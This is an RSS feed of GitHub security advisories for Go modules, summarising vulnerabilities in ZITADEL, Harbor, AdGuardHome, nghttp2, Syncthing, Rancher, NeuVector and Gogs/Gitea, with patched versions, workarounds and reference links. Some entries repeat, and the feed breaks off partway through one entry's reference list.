<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2023-10-11T04:01:53.086Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL's password reset does not respect the "Ignoring unknown usernames" setting]]></title>
        <id>https://github.com/advisories/GHSA-v683-rcxx-vpff</id>
        <link href="https://github.com/advisories/GHSA-v683-rcxx-vpff"/>
        <updated>2023-10-10T22:35:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL administrators can enable a setting called "Ignoring unknown usernames" which helps mitigate attacks that try to guess/enumerate usernames. While this settings was properly working during the authentication process it did not work correctly on the password reset flow. This meant that even if this feature was active that an attacker could use the password reset function to verify if an account exist within ZITADEL.</p>
<h3 id="patches">Patches</h3>
<p>This bug has been patched in versions &gt;2.27.2 beginning with <a href="https://github.com/zitadel/zitadel/releases/tag/v2.37.3">2.37.3</a> and <a href="https://github.com/zitadel/zitadel/releases/tag/v2.38.0">2.38.0</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>None available we advise to updated if this is needed.</p>
<h3 id="references">References</h3>
<p>None</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-v683-rcxx-vpff">https://github.com/zitadel/zitadel/security/advisories/GHSA-v683-rcxx-vpff</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-44399">https://nvd.nist.gov/vuln/detail/CVE-2023-44399</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.37.3">https://github.com/zitadel/zitadel/releases/tag/v2.37.3</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.38.0">https://github.com/zitadel/zitadel/releases/tag/v2.38.0</a></li>
<li><a href="https://github.com/advisories/GHSA-v683-rcxx-vpff">https://github.com/advisories/GHSA-v683-rcxx-vpff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v683-rcxx-vpff</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-10T21:30:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goharbor/harbor] Harbor timing attack risk]]></title>
        <id>https://github.com/advisories/GHSA-mq6f-5xh5-hgcf</id>
        <link href="https://github.com/advisories/GHSA-mq6f-5xh5-hgcf"/>
        <updated>2023-10-10T21:29:04.000Z</updated>
        <content type="html"><![CDATA[<p>In the Harbor jobservice container, the comparison of secrets in the authenticator type is prone to timing attacks. The vulnerability occurs due to the following code: <a href="https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69">https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69</a>
To avoid this issue, constant time comparison should be used.</p>
<pre><code>subtle.ConstantTimeCompare([]byte(expectedSecret), []byte(secret)) == 0
</code></pre>
<h3 id="impact">Impact</h3>
<p>This attack might be possible theoretically, but no workable proof of concept is available, and access complexity is set at High.
The jobservice exposes these APIs</p>
<pre><code>Create a job task --- POST /api/v1/jobs    
Get job task information --- GET /api/v1/jobs/{job_id}
Stop job task ---  POST /api/v1/jobs/{job_id}
Get job log task ---  GET /api/v1/jobs/{job_id}/log
Get job execution --- GET /api/v1/jobs/{job_id}/executions
Get job stats ---  GET /api/v1/stats
Get job service configuration ---  GET /api/v1/config
</code></pre>
<p>It is used to create jobs/stop job tasks and retrieve job task information.  If an attacker obtains the secrets, it is possible to retrieve the job information, create a job, or stop a job task. </p>
<p>The following versions of Harbor are involved:
&lt;=Harbor 2.8.2, &lt;=Harbor 2.7.2, &lt;= Harbor 2.6.x, &lt;=Harbor 1.10.17</p>
<h3 id="patches">Patches</h3>
<p>Harbor 2.8.3, Harbor 2.7.3, Harbor 1.10.18</p>
<h3 id="workarounds">Workarounds</h3>
<p>Because the jobservice only exposes HTTP service to harbor-core containers, blocking any inbound traffic from the external network to the jobservice container can reduce the risk.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to Porcupiney Hairs for reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goharbor/harbor/security/advisories/GHSA-mq6f-5xh5-hgcf">https://github.com/goharbor/harbor/security/advisories/GHSA-mq6f-5xh5-hgcf</a></li>
<li><a href="https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69">https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69</a></li>
<li><a href="https://github.com/goharbor/harbor/releases/tag/v1.10.18">https://github.com/goharbor/harbor/releases/tag/v1.10.18</a></li>
<li><a href="https://github.com/goharbor/harbor/releases/tag/v2.7.3">https://github.com/goharbor/harbor/releases/tag/v2.7.3</a></li>
<li><a href="https://github.com/goharbor/harbor/releases/tag/v2.8.3">https://github.com/goharbor/harbor/releases/tag/v2.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-mq6f-5xh5-hgcf">https://github.com/advisories/GHSA-mq6f-5xh5-hgcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq6f-5xh5-hgcf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-10T21:29:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goharbor/harbor] Harbor timing attack risk]]></title>
        <id>https://github.com/advisories/GHSA-mq6f-5xh5-hgcf</id>
        <link href="https://github.com/advisories/GHSA-mq6f-5xh5-hgcf"/>
        <updated>2023-10-10T21:29:04.000Z</updated>
        <content type="html"><![CDATA[<p>In the Harbor jobservice container, the comparison of secrets in the authenticator type is prone to timing attacks. The vulnerability occurs due to the following code: <a href="https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69">https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69</a>
To avoid this issue, constant time comparison should be used.</p>
<pre><code>subtle.ConstantTimeCompare([]byte(expectedSecret), []byte(secret)) == 0
</code></pre>
<h3 id="impact">Impact</h3>
<p>This attack might be possible theoretically, but no workable proof of concept is available, and access complexity is set at High.
The jobservice exposes these APIs</p>
<pre><code>Create a job task --- POST /api/v1/jobs    
Get job task information --- GET /api/v1/jobs/{job_id}
Stop job task ---  POST /api/v1/jobs/{job_id}
Get job log task ---  GET /api/v1/jobs/{job_id}/log
Get job execution --- GET /api/v1/jobs/{job_id}/executions
Get job stats ---  GET /api/v1/stats
Get job service configuration ---  GET /api/v1/config
</code></pre>
<p>It is used to create jobs/stop job tasks and retrieve job task information.  If an attacker obtains the secrets, it is possible to retrieve the job information, create a job, or stop a job task. </p>
<p>The following versions of Harbor are involved:
&lt;=Harbor 2.8.2, &lt;=Harbor 2.7.2, &lt;= Harbor 2.6.x, &lt;=Harbor 1.10.17</p>
<h3 id="patches">Patches</h3>
<p>Harbor 2.8.3, Harbor 2.7.3, Harbor 1.10.18</p>
<h3 id="workarounds">Workarounds</h3>
<p>Because the jobservice only exposes HTTP service to harbor-core containers, blocking any inbound traffic from the external network to the jobservice container can reduce the risk.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to Porcupiney Hairs for reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goharbor/harbor/security/advisories/GHSA-mq6f-5xh5-hgcf">https://github.com/goharbor/harbor/security/advisories/GHSA-mq6f-5xh5-hgcf</a></li>
<li><a href="https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69">https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69</a></li>
<li><a href="https://github.com/goharbor/harbor/releases/tag/v1.10.18">https://github.com/goharbor/harbor/releases/tag/v1.10.18</a></li>
<li><a href="https://github.com/goharbor/harbor/releases/tag/v2.7.3">https://github.com/goharbor/harbor/releases/tag/v2.7.3</a></li>
<li><a href="https://github.com/goharbor/harbor/releases/tag/v2.8.3">https://github.com/goharbor/harbor/releases/tag/v2.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-mq6f-5xh5-hgcf">https://github.com/advisories/GHSA-mq6f-5xh5-hgcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq6f-5xh5-hgcf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-10T21:29:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goharbor/harbor] Harbor timing attack risk]]></title>
        <id>https://github.com/advisories/GHSA-mq6f-5xh5-hgcf</id>
        <link href="https://github.com/advisories/GHSA-mq6f-5xh5-hgcf"/>
        <updated>2023-10-10T21:29:04.000Z</updated>
        <content type="html"><![CDATA[<p>In the Harbor jobservice container, the comparison of secrets in the authenticator type is prone to timing attacks. The vulnerability occurs due to the following code: <a href="https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69">https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69</a>
To avoid this issue, constant time comparison should be used.</p>
<pre><code>subtle.ConstantTimeCompare([]byte(expectedSecret), []byte(secret)) == 0
</code></pre>
<h3 id="impact">Impact</h3>
<p>This attack might be possible theoretically, but no workable proof of concept is available, and access complexity is set at High.
The jobservice exposes these APIs</p>
<pre><code>Create a job task --- POST /api/v1/jobs    
Get job task information --- GET /api/v1/jobs/{job_id}
Stop job task ---  POST /api/v1/jobs/{job_id}
Get job log task ---  GET /api/v1/jobs/{job_id}/log
Get job execution --- GET /api/v1/jobs/{job_id}/executions
Get job stats ---  GET /api/v1/stats
Get job service configuration ---  GET /api/v1/config
</code></pre>
<p>It is used to create jobs/stop job tasks and retrieve job task information.  If an attacker obtains the secrets, it is possible to retrieve the job information, create a job, or stop a job task. </p>
<p>The following versions of Harbor are involved:
&lt;=Harbor 2.8.2, &lt;=Harbor 2.7.2, &lt;= Harbor 2.6.x, &lt;=Harbor 1.10.17</p>
<h3 id="patches">Patches</h3>
<p>Harbor 2.8.3, Harbor 2.7.3, Harbor 1.10.18</p>
<h3 id="workarounds">Workarounds</h3>
<p>Because the jobservice only exposes HTTP service to harbor-core containers, blocking any inbound traffic from the external network to the jobservice container can reduce the risk.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to Porcupiney Hairs for reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goharbor/harbor/security/advisories/GHSA-mq6f-5xh5-hgcf">https://github.com/goharbor/harbor/security/advisories/GHSA-mq6f-5xh5-hgcf</a></li>
<li><a href="https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69">https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69</a></li>
<li><a href="https://github.com/goharbor/harbor/releases/tag/v1.10.18">https://github.com/goharbor/harbor/releases/tag/v1.10.18</a></li>
<li><a href="https://github.com/goharbor/harbor/releases/tag/v2.7.3">https://github.com/goharbor/harbor/releases/tag/v2.7.3</a></li>
<li><a href="https://github.com/goharbor/harbor/releases/tag/v2.8.3">https://github.com/goharbor/harbor/releases/tag/v2.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-mq6f-5xh5-hgcf">https://github.com/advisories/GHSA-mq6f-5xh5-hgcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq6f-5xh5-hgcf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-10T21:29:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/AdguardTeam/AdGuardHome] AdGuardHome vulnerable to Cross-Site Request Forgery]]></title>
        <id>https://github.com/advisories/GHSA-mwwc-3jv2-62j3</id>
        <link href="https://github.com/advisories/GHSA-mwwc-3jv2-62j3"/>
        <updated>2023-10-10T19:20:00.000Z</updated>
        <content type="html"><![CDATA[<p>In AdGuardHome, versions v0.95 through v0.108.0-b.13 are vulnerable to Cross-Site Request Forgery (CSRF), in the custom filtering rules functionality. An attacker can persuade an authorized user to follow a malicious link, resulting in deleting/modifying the custom filtering rules.</p>
<p>The file that contains the vulnerable code is no longer present as of v0.108.0-b.16.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-32175">https://nvd.nist.gov/vuln/detail/CVE-2022-32175</a></li>
<li><a href="https://github.com/AdguardTeam/AdGuardHome/blob/v0.108.0-b.13/internal/home/controlfiltering.go#L265">https://github.com/AdguardTeam/AdGuardHome/blob/v0.108.0-b.13/internal/home/controlfiltering.go#L265</a></li>
<li><a href="https://www.mend.io/vulnerability-database/CVE-2022-32175">https://www.mend.io/vulnerability-database/CVE-2022-32175</a></li>
<li><a href="https://github.com/AdguardTeam/AdGuardHome/blob/v0.108.0-b.15/internal/home/controlfiltering.go">https://github.com/AdguardTeam/AdGuardHome/blob/v0.108.0-b.15/internal/home/controlfiltering.go</a></li>
<li><a href="https://github.com/AdguardTeam/AdGuardHome/blob/v0.108.0-b.16/internal/home/controlfiltering.go">https://github.com/AdguardTeam/AdGuardHome/blob/v0.108.0-b.16/internal/home/controlfiltering.go</a></li>
<li><a href="https://github.com/AdguardTeam/AdGuardHome/commit/756b14a61de138889130c239406dae43f1f115cb">https://github.com/AdguardTeam/AdGuardHome/commit/756b14a61de138889130c239406dae43f1f115cb</a></li>
<li><a href="https://github.com/advisories/GHSA-mwwc-3jv2-62j3">https://github.com/advisories/GHSA-mwwc-3jv2-62j3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mwwc-3jv2-62j3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-11T19:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/nghttp2/nghttp2] github.com/nghttp2/nghttp2 has HTTP/2 Rapid Reset]]></title>
        <id>https://github.com/advisories/GHSA-vx74-f528-fxqg</id>
        <link href="https://github.com/advisories/GHSA-vx74-f528-fxqg"/>
        <updated>2023-10-10T18:23:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Rapidly creating and cancelling streams (HEADERS frame immediately followed by RST_STREAM) without bound cause denial of service.</p>
<p>See <a href="https://www.cve.org/CVERecord?id=CVE-2023-44487">https://www.cve.org/CVERecord?id=CVE-2023-44487</a> for details.</p>
<h3 id="patches">Patches</h3>
<p>nghttp2 v1.57.0 mitigates this vulnerability by default.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading to nghttp2 v1.57.0 is not possible, implement <code>nghttp2_on_frame_recv_callback</code>, and check and count RST_STREAM frames.  If excessive number of RST_STREAM are received, then take action, such as dropping connection silently, or call <code>nghttp2_submit_goaway</code> and gracefully terminate the connection.</p>
<h3 id="references">References</h3>
<p>The following commit mitigates this vulnerability:</p>
<ul>
<li><a href="https://github.com/nghttp2/nghttp2/commit/72b4af6143681f528f1d237b21a9a7aee1738832">https://github.com/nghttp2/nghttp2/commit/72b4af6143681f528f1d237b21a9a7aee1738832</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nghttp2/nghttp2/security/advisories/GHSA-vx74-f528-fxqg">https://github.com/nghttp2/nghttp2/security/advisories/GHSA-vx74-f528-fxqg</a></li>
<li><a href="https://github.com/nghttp2/nghttp2/commit/72b4af6143681f528f1d237b21a9a7aee1738832">https://github.com/nghttp2/nghttp2/commit/72b4af6143681f528f1d237b21a9a7aee1738832</a></li>
<li><a href="https://github.com/nghttp2/nghttp2/releases/tag/v1.57.0">https://github.com/nghttp2/nghttp2/releases/tag/v1.57.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vx74-f528-fxqg">https://github.com/advisories/GHSA-vx74-f528-fxqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vx74-f528-fxqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-10T18:23:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/syncthing/syncthing] Syncthing vulnerable to symlink traversal and arbitrary file overwrite]]></title>
        <id>https://github.com/advisories/GHSA-28xp-g7f6-7mhf</id>
        <link href="https://github.com/advisories/GHSA-28xp-g7f6-7mhf"/>
        <updated>2023-10-10T16:33:32.000Z</updated>
        <content type="html"><![CDATA[<p>Syncthing version 0.14.33 and older erronously versions symlinks when they are deleted. If a directory is then created with the same name, a file created in that directory, and the file deleted, it is moved into the symlink target. This can lead to symlink traversal resulting in arbitrary file overwrite.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000420">https://nvd.nist.gov/vuln/detail/CVE-2017-1000420</a></li>
<li><a href="https://github.com/syncthing/syncthing/issues/4286">https://github.com/syncthing/syncthing/issues/4286</a></li>
<li><a href="https://github.com/syncthing/syncthing/commit/f1f21bf22020d9b881478c2e942ba6943c8da2f3">https://github.com/syncthing/syncthing/commit/f1f21bf22020d9b881478c2e942ba6943c8da2f3</a></li>
<li><a href="https://github.com/advisories/GHSA-28xp-g7f6-7mhf">https://github.com/advisories/GHSA-28xp-g7f6-7mhf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-28xp-g7f6-7mhf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-14T03:49:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/rancher/rancher] Rancher Access Control Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w3x4-9854-95x8</id>
        <link href="https://github.com/advisories/GHSA-w3x4-9854-95x8"/>
        <updated>2023-10-06T21:14:53.000Z</updated>
        <content type="html"><![CDATA[<p>Rancher Labs rancher server 1.2.0+ is vulnerable to authenticated users disabling access control via an API call. This is fixed in versions rancher/server:v1.2.4, rancher/server:v1.3.5, rancher/server:v1.4.3, and rancher/server:v1.5.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7297">https://nvd.nist.gov/vuln/detail/CVE-2017-7297</a></li>
<li><a href="https://github.com/rancher/rancher/issues/8296">https://github.com/rancher/rancher/issues/8296</a></li>
<li><a href="https://web.archive.org/web/20200227181556/http://www.securityfocus.com/bid/97180">https://web.archive.org/web/20200227181556/http://www.securityfocus.com/bid/97180</a></li>
<li><a href="https://github.com/advisories/GHSA-w3x4-9854-95x8">https://github.com/advisories/GHSA-w3x4-9854-95x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3x4-9854-95x8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:02:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/rancher/rancher] Rancher Access Control Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w3x4-9854-95x8</id>
        <link href="https://github.com/advisories/GHSA-w3x4-9854-95x8"/>
        <updated>2023-10-06T21:14:53.000Z</updated>
        <content type="html"><![CDATA[<p>Rancher Labs rancher server 1.2.0+ is vulnerable to authenticated users disabling access control via an API call. This is fixed in versions rancher/server:v1.2.4, rancher/server:v1.3.5, rancher/server:v1.4.3, and rancher/server:v1.5.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7297">https://nvd.nist.gov/vuln/detail/CVE-2017-7297</a></li>
<li><a href="https://github.com/rancher/rancher/issues/8296">https://github.com/rancher/rancher/issues/8296</a></li>
<li><a href="https://web.archive.org/web/20200227181556/http://www.securityfocus.com/bid/97180">https://web.archive.org/web/20200227181556/http://www.securityfocus.com/bid/97180</a></li>
<li><a href="https://github.com/advisories/GHSA-w3x4-9854-95x8">https://github.com/advisories/GHSA-w3x4-9854-95x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3x4-9854-95x8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:02:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/rancher/rancher] Rancher Access Control Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w3x4-9854-95x8</id>
        <link href="https://github.com/advisories/GHSA-w3x4-9854-95x8"/>
        <updated>2023-10-06T21:14:53.000Z</updated>
        <content type="html"><![CDATA[<p>Rancher Labs rancher server 1.2.0+ is vulnerable to authenticated users disabling access control via an API call. This is fixed in versions rancher/server:v1.2.4, rancher/server:v1.3.5, rancher/server:v1.4.3, and rancher/server:v1.5.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7297">https://nvd.nist.gov/vuln/detail/CVE-2017-7297</a></li>
<li><a href="https://github.com/rancher/rancher/issues/8296">https://github.com/rancher/rancher/issues/8296</a></li>
<li><a href="https://web.archive.org/web/20200227181556/http://www.securityfocus.com/bid/97180">https://web.archive.org/web/20200227181556/http://www.securityfocus.com/bid/97180</a></li>
<li><a href="https://github.com/advisories/GHSA-w3x4-9854-95x8">https://github.com/advisories/GHSA-w3x4-9854-95x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3x4-9854-95x8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:02:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/rancher/rancher] Rancher Access Control Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w3x4-9854-95x8</id>
        <link href="https://github.com/advisories/GHSA-w3x4-9854-95x8"/>
        <updated>2023-10-06T21:14:53.000Z</updated>
        <content type="html"><![CDATA[<p>Rancher Labs rancher server 1.2.0+ is vulnerable to authenticated users disabling access control via an API call. This is fixed in versions rancher/server:v1.2.4, rancher/server:v1.3.5, rancher/server:v1.4.3, and rancher/server:v1.5.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7297">https://nvd.nist.gov/vuln/detail/CVE-2017-7297</a></li>
<li><a href="https://github.com/rancher/rancher/issues/8296">https://github.com/rancher/rancher/issues/8296</a></li>
<li><a href="https://web.archive.org/web/20200227181556/http://www.securityfocus.com/bid/97180">https://web.archive.org/web/20200227181556/http://www.securityfocus.com/bid/97180</a></li>
<li><a href="https://github.com/advisories/GHSA-w3x4-9854-95x8">https://github.com/advisories/GHSA-w3x4-9854-95x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3x4-9854-95x8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:02:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/neuvector/neuvector] JWT token compromise can allow malicious actions including Remote Code Execution (RCE) ]]></title>
        <id>https://github.com/advisories/GHSA-622h-h2p8-743x</id>
        <link href="https://github.com/advisories/GHSA-622h-h2p8-743x"/>
        <updated>2023-10-06T20:43:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A user can reverse engineer the JWT token (JSON Web Token) used in authentication for Manager and API access, forging a valid NeuVector Token to perform malicious activity in NeuVector. This can lead to an RCE. </p>
<h3 id="patches">Patches</h3>
<p>Upgrade to NeuVector <a href="https://open-docs.neuvector.com/releasenotes/5x">version 5.2.2</a> or later and latest Helm chart (2.6.3+). </p>
<ul>
<li>In 5.2.2 the certificate for JWT-signing is created automatically by controller with validity of 90days and rotated automatically.</li>
<li>Use Helm-based deployment/upgrade to 5.2.2 to generate a unique certificate for Manager, REST API, ahd registry adapter. Helm based installation/upgrade is required in order to automatically generate certificates upon initial installation and each subsequent upgrade. </li>
<li>See <a href="https://open-docs.neuvector.com/releasenotes/5x">release notes</a> for manual/yaml based deployment advice.</li>
<li>5.2.2 also implements additional protections against possible RCE for the feature of custom compliance scripts.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Users can replace the Manager &amp; Controller certificate manually by following the instructions in documented <a href="https://open-docs.neuvector.com/configuration/console/replacecert">here</a>. However, upgrading to 5.2.2 and replacing Manager/REST API certificate is recommended to provide additional security enhancements to prevent possible attempted exploit and resulting RCE. See <a href="https://open-docs.neuvector.com/releasenotes/5x">release notes</a> for additional details.</p>
<h3 id="for-more-information">For More Information</h3>
<p>View the NeuVector <a href="https://github.com/neuvector/neuvector/security">Security Policy</a> </p>
<p>General NeuVector <a href="https://open-docs.neuvector.com/">documentation</a> </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/neuvector/neuvector/security/advisories/GHSA-622h-h2p8-743x">https://github.com/neuvector/neuvector/security/advisories/GHSA-622h-h2p8-743x</a></li>
<li><a href="https://open-docs.neuvector.com/releasenotes/5x">https://open-docs.neuvector.com/releasenotes/5x</a></li>
<li><a href="https://github.com/advisories/GHSA-622h-h2p8-743x">https://github.com/advisories/GHSA-622h-h2p8-743x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-622h-h2p8-743x</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-10-06T20:43:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gogs.io/gogs] Gogs and Gitea SSRF Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-fg3x-rwq9-74cw</id>
        <link href="https://github.com/advisories/GHSA-fg3x-rwq9-74cw"/>
        <updated>2023-10-06T17:43:38.000Z</updated>
        <content type="html"><![CDATA[<p>An SSRF vulnerability in webhooks in Gitea through 1.5.0-rc2 and Gogs through 0.11.53 allows remote attackers to access intranet services.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-15192">https://nvd.nist.gov/vuln/detail/CVE-2018-15192</a></li>
<li><a href="https://github.com/go-gitea/gitea/issues/4624">https://github.com/go-gitea/gitea/issues/4624</a></li>
<li><a href="https://github.com/gogs/gogs/issues/5366">https://github.com/gogs/gogs/issues/5366</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/17482">https://github.com/go-gitea/gitea/pull/17482</a></li>
<li><a href="https://github.com/gogs/gogs/pull/6002">https://github.com/gogs/gogs/pull/6002</a></li>
<li><a href="https://github.com/go-gitea/gitea/commit/599ff1c054e436daa4dc3f049aa8661d9c2395f9">https://github.com/go-gitea/gitea/commit/599ff1c054e436daa4dc3f049aa8661d9c2395f9</a></li>
<li><a href="https://github.com/gogs/gogs/commit/22717a1c064511cf37c46af5e650baf7184cf25b">https://github.com/gogs/gogs/commit/22717a1c064511cf37c46af5e650baf7184cf25b</a></li>
<li><a href="https://github.com/advisories/GHSA-fg3x-rwq9-74cw">https://github.com/advisories/GHSA-fg3x-rwq9-74cw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fg3x-rwq9-74cw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-14T02:20:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[code.gitea.io/gitea] Gogs and Gitea SSRF Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-fg3x-rwq9-74cw</id>
        <link href="https://github.com/advisories/GHSA-fg3x-rwq9-74cw"/>
        <updated>2023-10-06T17:43:38.000Z</updated>
        <content type="html"><![CDATA[<p>An SSRF vulnerability in webhooks in Gitea through 1.5.0-rc2 and Gogs through 0.11.53 allows remote attackers to access intranet services.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-15192">https://nvd.nist.gov/vuln/detail/CVE-2018-15192</a></li>
<li><a href="https://github.com/go-gitea/gitea/issues/4624">https://github.com/go-gitea/gitea/issues/4624</a></li>
<li><a href="https://github.com/gogs/gogs/issues/5366">https://github.com/gogs/gogs/issues/5366</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/17482">https://github.com/go-gitea/gitea/pull/17482</a></li>
<li><a href="https://github.com/gogs/gogs/pull/6002">https://github.com/gogs/gogs/pull/6002</a></li>
